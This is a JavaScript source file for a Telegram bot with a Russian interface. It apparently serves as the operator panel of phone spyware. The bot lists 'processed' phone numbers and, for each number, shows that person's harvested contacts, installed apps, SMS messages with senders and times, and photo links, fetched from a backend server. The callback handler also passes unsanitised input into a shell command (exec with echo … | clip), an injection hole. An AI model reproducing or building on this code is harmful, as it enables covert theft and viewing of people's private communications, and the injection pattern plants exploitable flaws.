const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
const { exec } = require('child_process');
const token = process.env.TOKEN;
const bot = new TelegramBot(token, { polling: true });
const server = require('./requests/Server')
const main_keyboard = {
    reply_markup: {
        keyboard: [
            [{ text: 'Просмотреть отработанные номера' }, { text: 'Инфа по номеру' }],
        ],
        resize_keyboard: true,
    }
};
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Привет', main_keyboard);
});
bot.onText(/Просмотреть отработанные номера/, async (msg) => {
    const chatId = msg.chat.id;
    const options = {
        parse_mode: 'MarkdownV2',
        reply_markup: {
            remove_keyboard: false
        }
    };
    const users = await server.getUsers();
    const userMessages = users.map((element) => {
        const user_id = "`" + element.ID + "`"; // Изменение формата сообщения
        return `${user_id}\n`;
    })
    const messagesToSendusers = userMessages;
    const pageSizeusers = 7;
    const totalPagesusers = Math.ceil(messagesToSendusers.length / pageSizeusers);
    let currentPageusers = 1;
    console.log(messagesToSendusers.length)
    if (messagesToSendusers.length > 7) {
        let currentMessageId = null;
        const sendCurrentPage = async () => {
            let startIndex;
            let endIndex;
            let pageMessages;
            let paginationButtons;
            let currentPage;
            let totalPages;

            currentPage = currentPageusers;
            totalPages = totalPagesusers;
            startIndex = (currentPage - 1) * pageSizeusers;
            endIndex = Math.min(startIndex + pageSizeusers, messagesToSendusers.length);
            pageMessages = messagesToSendusers.slice(startIndex, endIndex);

            paginationButtons = [];
            if (currentPage > 1) {
                paginationButtons.push({
                    text: '◀️ Пред.',
                    callback_data: 'prev_page'
                });
            }
            if (currentPage < totalPages) {
                paginationButtons.push({
                    text: 'След. ▶️',
                    callback_data: 'next_page'
                });
            }

            const messageText = pageMessages.map(message => `${message}`).join('\n');

            if (currentMessageId) {
                try {
                    await bot.editMessageText(`${messageText}`, {
                        chat_id: chatId,
                        message_id: currentMessageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [paginationButtons]
                        }
                    });
                } catch (error) {

                }
            } else {
                const message = await bot.sendMessage(chatId, `${messageText}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [paginationButtons]
                    }
                });
                currentMessageId = message.message_id;
            }
        };
        bot.on('callback_query', async (query) => {
            if (query.data === 'prev_page') {
                currentPageusers = Math.max(1, currentPageusers - 1);
            } else if (query.data === 'next_page') {
                currentPageusers = Math.min(totalPagesusers, currentPageusers + 1);
            }
            else if (query.data.startsWith('copy:')) {
                const numberToCopy = query.data.split(':')[1];
                exec(`echo ${numberToCopy} | clip`);
                bot.answerCallbackQuery(query.id, 'Номер скопирован в буфер обмена');
            }
            sendCurrentPage();
        });
        sendCurrentPage();
    }
    else {
        const messageText = messagesToSendusers.map(message => `${message}`).join('\n');
        bot.sendMessage(chatId, `${messageText}`, options)
    }
});
bot.onText(/Инфа по номеру/, async (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            remove_keyboard: false
        }
    };
    bot.sendMessage(chatId, 'Введите номер:', options)
        .then(() => {
            bot.once('message', async (msg) => {
                const phoneNumber = msg.text;
                const userdataByPhone = await server.getUserData(phoneNumber);
                const databtns = []
                var appMessages = ''
                var contactMessages = ''
                var messageMessages = ''
                var photosMessages = ''
                if (userdataByPhone.data != 'Данные пользователя не найдены') {
                    if (userdataByPhone.data?.userContacts[0]) {
                        if (userdataByPhone.data.userContacts[0].contacts.length > 0) {
                            contactMessages = userdataByPhone.data.userContacts[0].contacts.map(element => {
                                const name = `Имя: ${element.givenName}`;
                                const phones = `Номера: ${element.phoneNumbers.map(phone => phone.number).join(', ')}`;
                                return `Телефонная книга\n${name}\n${phones}`;
                            });
                            databtns.push({ text: "Контакты", callback_data: "Sendcontacts" })
                        }
                    }
                    if (userdataByPhone.data?.userApps[0]) {
                        if (userdataByPhone.data.userApps[0].apps.length > 0) {
                            appMessages = userdataByPhone.data.userApps[0].apps.map(element => {
                                const label = `Название: ${element.label}`;
                                const packageName = `Название пакета: ${element.packageName}`;
                                return `${label}\n${packageName}`;
                            });
                            databtns.push({ text: "Приложения", callback_data: "Sendapps" })
                        }
                    }
                    if (userdataByPhone.data?.userMessages[0]) {
                        if (userdataByPhone.data.userMessages[0].messages.length > 0) {
                            messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
                                const body = `Сообщение: ${element.messageBody}`;
                                const originatingAddress = `Отправитель: ${element.sender}`;
                                const date = `Дата и время: ${new Date(element.timestamp).toLocaleString()}`;
                                return `${body}\n${originatingAddress}\n${date}`;
                            });
                            databtns.push({ text: "Сообщения", callback_data: "Sendmessages" });
                        }
                    }
                    if (userdataByPhone.data?.userPhotos[0]) {
                        if (userdataByPhone.data.userPhotos[0].urls.length > 0) {
                            photosMessages = userdataByPhone.data.userPhotos[0].urls.map(element => {
                                const body = `Ссылка: ${element}`;
                                return `${body}`;
                            });
                            databtns.push({ text: "Фотки", callback_data: "Sendimages" });
                        }
                    }
                    const message = await bot.sendMessage(chatId, "Выберите данные", {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                databtns
                            ]
                        }
                    })
                    const messagesToSendcontact = contactMessages;
                    const pageSizecontact = 7;
                    const totalPagescontact = Math.ceil(messagesToSendcontact.length / pageSizecontact);
                    let currentPagecontact = 1;

                    const messagesToSendapp = appMessages;
                    const pageSizeapp = 7;
                    const totalPagesapp = Math.ceil(messagesToSendapp.length / pageSizeapp);
                    let currentPageapp = 1;

                    const messagesToSendmessage = messageMessages;
                    const pageSizemessage = 7;
                    const totalPagesmessage = Math.ceil(messagesToSendmessage.length / pageSizemessage);
                    let currentPagemessage = 1;

                    const messagesToSendimage = photosMessages;
                    const pageSizeimage = 10;
                    const totalPagesimage = Math.ceil(messagesToSendimage.length / pageSizeimage);
                    let currentPageimage = 1;

                    let currentMessageId = null;
                    let paginationMessageId = null;
                    const sendCurrentPage = async (DataChoose) => {
                        let startIndex;
                        let endIndex;
                        let pageMessages;
                        let paginationButtons;
                        let currentPage;
                        let totalPages;

                        if (DataChoose.contacts) {
                            currentPage = currentPagecontact;
                            totalPages = totalPagescontact;
                            startIndex = (currentPage - 1) * pageSizecontact;
                            endIndex = Math.min(startIndex + pageSizecontact, messagesToSendcontact.length);
                            pageMessages = messagesToSendcontact.slice(startIndex, endIndex);
                        } else if (DataChoose.apps) {
                            currentPage = currentPageapp;
                            totalPages = totalPagesapp;
                            startIndex = (currentPage - 1) * pageSizeapp;
                            endIndex = Math.min(startIndex + pageSizeapp, messagesToSendapp.length);
                            pageMessages = messagesToSendapp.slice(startIndex, endIndex);
                        } else if (DataChoose.messages) {
                            currentPage = currentPagemessage;
                            totalPages = totalPagesmessage;
                            startIndex = (currentPage - 1) * pageSizemessage;
                            endIndex = Math.min(startIndex + pageSizemessage, messagesToSendmessage.length);
                            pageMessages = messagesToSendmessage.slice(startIndex, endIndex);
                        } else if (DataChoose.images) {
                            currentPage = currentPageimage;
                            totalPages = totalPagesimage;
                            startIndex = (currentPage - 1) * pageSizeimage;
                            endIndex = Math.min(startIndex + pageSizeimage, messagesToSendimage.length);
                            pageMessages = messagesToSendimage.slice(startIndex, endIndex);
                        }

                        paginationButtons = [];
                        if (currentPage > 1) {
                            paginationButtons.push({
                                text: '◀️ Пред.',
                                callback_data: 'prev_page'
                            });
                        }
                        if (currentPage < totalPages) {
                            paginationButtons.push({
                                text: 'След. ▶️',
                                callback_data: 'next_page'
                            });
                        }

                        const messageText = pageMessages.map(message => `<pre>${message}</pre>`).join('\n');

                        if (currentMessageId) {
                            try {
                                await bot.editMessageText(`${messageText}`, {
                                    chat_id: chatId,
                                    message_id: currentMessageId,
                                    parse_mode: 'HTML',
                                    reply_markup: {
                                        inline_keyboard: [paginationButtons]
                                    }
                                });
                            } catch (error) {

                            }
                        } else {
                            const message = await bot.sendMessage(chatId, `${messageText}`, {
                                parse_mode: 'HTML',
                                reply_markup: {
                                    inline_keyboard: [paginationButtons]
                                }
                            });
                            currentMessageId = message.message_id;
                        }
                    };

                    const DataChoose = { contacts: false, apps: false, messages: false, images: false }
                    bot.on('callback_query', async (query) => {
                        try {
                            if (query.data === "Sendcontacts") {
                                DataChoose.contacts = true
                                DataChoose.apps = false
                                DataChoose.messages = false
                                DataChoose.images = false
                            } else if (query.data === "Sendapps") {
                                DataChoose.apps = true
                                DataChoose.contacts = false
                                DataChoose.messages = false
                                DataChoose.images = false
                            }
                            else if (query.data === "Sendmessages") {
                                DataChoose.messages = true
                                DataChoose.apps = false
                                DataChoose.contacts = false
                                DataChoose.images = false
                            }
                            else if (query.data === "Sendimages") {
                                DataChoose.images = true
                                DataChoose.messages = false
                                DataChoose.apps = false
                                DataChoose.contacts = false
                            }
                            if (query.data === 'prev_page') {
                                if (DataChoose.contacts) {
                                    currentPagecontact = Math.max(1, currentPagecontact - 1);
                                } else if (DataChoose.apps) {
                                    currentPageapp = Math.max(1, currentPageapp - 1);
                                } else if (DataChoose.messages) {
                                    currentPagemessage = Math.max(1, currentPagemessage - 1);
                                }
                                else if (DataChoose.images) {
                                    currentPageimage = Math.max(1, currentPageimage - 1);
                                }
                            } else if (query.data === 'next_page') {
                                if (DataChoose.contacts) {
                                    currentPagecontact = Math.min(totalPagescontact, currentPagecontact + 1);
                                } else if (DataChoose.apps) {
                                    currentPageapp = Math.min(totalPagesapp, currentPageapp + 1);
                                } else if (DataChoose.messages) {
                                    currentPagemessage = Math.min(totalPagesmessage, currentPagemessage + 1);
                                } else if (DataChoose.images) {
                                    currentPageimage = Math.min(totalPagesimage, currentPageimage + 1);
                                }
                            }
                            sendCurrentPage(DataChoose);
                        } catch (error) {
                            console.log(error.message)
                        }
                    });
                } else {
                    await bot.sendMessage(chatId, 'Данные пользователя не найдены')
                }

            });
        });
});
